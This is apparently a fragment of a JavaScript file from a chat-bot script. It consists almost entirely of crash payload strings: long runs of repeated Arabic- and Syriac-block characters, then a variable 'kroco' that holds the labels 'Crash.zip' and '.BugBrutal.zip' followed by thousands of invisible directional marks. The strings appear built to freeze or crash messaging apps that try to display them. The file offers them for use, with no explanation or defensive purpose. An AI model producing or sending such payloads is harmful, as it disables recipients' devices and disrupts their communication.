𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬`
  
  let kroco = `📄Crash.zip                                                             📄.BugBrutal.zip                                                                  
★‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏